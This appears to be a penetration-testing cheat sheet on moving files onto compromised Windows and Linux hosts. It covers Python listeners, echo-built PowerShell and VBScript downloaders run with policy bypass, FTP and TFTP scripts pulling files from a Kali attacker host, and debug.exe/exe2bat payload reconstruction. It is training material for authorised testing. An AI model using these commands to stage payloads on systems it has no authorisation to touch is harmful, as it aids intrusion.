# File Transfers

## Table of Contents
* [wget](#wget)
   * [Listener (Python)](#listener-python)
      * [HTTP](#http)
      * [HTTPS](#https)
   * [Powershell wget](#powershell-wget)
   * [VBScript wget](#vbscript-wget)
   * [PHP wget](#php-wget)
* [FTP](#ftp)
* [TFTP](#tftp)
* [debug.exe](#debugexe)


## wget

### Listener (Python)

#### HTTP
```
python -m SimpleHTTPServer 80
```
```
python3 -m http.server 80
```

#### HTTPS
[SimpleHTTPSServer.py](SimpleHTTPSServer.py) script (Python 2 only).

Requires SSL/TLS certificate (server.pem):
```
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

##### Usage
```
python SimpleHTTPSServer.py 443
```


### Powershell wget
Create [Powershell wget script](wget.ps1) on target system via "echo" commands, then execute to download files.

#### Create script on target system
```
echo param ([String]$url="",[String]$outfile="")>> wget.ps1
echo If($url -eq "") { $sn = $MyInvocation.MyCommand.Name; Write-Host "Usage: $sn -url [URL] [-outfile [FILENAME]]"; Exit }>> wget.ps1
echo If($outfile -eq "") { [array]$ss = $url.split("/"); $outfile = $ss[$ss.Count-1] }>> wget.ps1
echo $storageDir = $pwd>> wget.ps1
echo $webclient = New-Object System.Net.WebClient>> wget.ps1
echo $webclient.DownloadFile($url,$outfile)>> wget.ps1
```

#### Usage
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 -url [URL] [-outfile [FILENAME]]
```

#### Options
```
-url [URL]: Download file from [URL] url
-outfile [FILENAME]: Save downloaded file to [FILENAME] (optional)
```


### VBScript wget
Create [VBScript wget script](wget.vbs) on target system via "echo" commands, then execute to download files.

#### Create script on target system
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

#### Usage
```
cscript wget.vbs [URL] [FILENAME]
```

#### Options
```
[URL]: Download file from [URL] url
[FILENAME]: Save downloaded file to [FILENAME]
```

### PHP wget
```
<?php file_put_contents("[LOCAL_FILENAME]", fopen("[URL]", 'r')); ?>
```


## FTP
FTP transfers are not simple to initiate. They should mostly be used on Windows targets when other methods are not available.

FTP transfers are conducted using [non-interactive FTP scripts](ftp.txt).

### Start FTP Server (pure-ftpd) on Kali
```
systemctl start pure-ftpd
```

### Create non-interactive script on target system (replace [KALI_IP], [FTP_USER], [FTP_PASSWORD], and [FILE] accordingly)
```
echo open [KALI_IP] 21> ftp.txt
echo USER [FTP_USER]>> ftp.txt
echo [FTP_PASSWORD]>> ftp.txt
echo bin>> ftp.txt
echo GET [FILE]>> ftp.txt
echo bye>> ftp.txt
```

### Download file with FTP from compromised Windows system
```
ftp -v -n -s:ftp.txt
```


## TFTP
While TFTP file transfers are easy to initiate, they can be PAINFULLY slow. Therefore, other transfer methods should be used if they are available.

### Start TFTP server (atftpd) on Kali (hosted files located in /home/tftp)
```
atftpd --logfile=/var/log/atftpd.log --daemon --port 69 /home/tftp/
```

### Download file with tftp from compromised system
```
tftp -i [KALI_VM_IP] get [FILENAME]
```


## debug.exe
Limited to 32-bit Windows systems, and file sizes up to 64KB. Therefore, this is not a preferred file transfer method if easier/faster methods are available.

### Generic procedure
* Compress exe file with upx
* Convert exe to batch file using exe2bat
* Copy output into shell on compromised system

### upx
Compress executables for easier transfer via debug.exe.

#### Options
```
-o [FILE]: output compressed executable to [FILE]
-9: compress as much as possible
```

### exe2bat
Convert exe files into batch files containing many "echo" commands before a "debug.exe" command

Intented to be pasted into a shell on a compromised system, and will re-create the original .exe file

```
wine /usr/share/windows-binaries/exe2bat.exe [IN_EXE] [OUT_BAT]
```

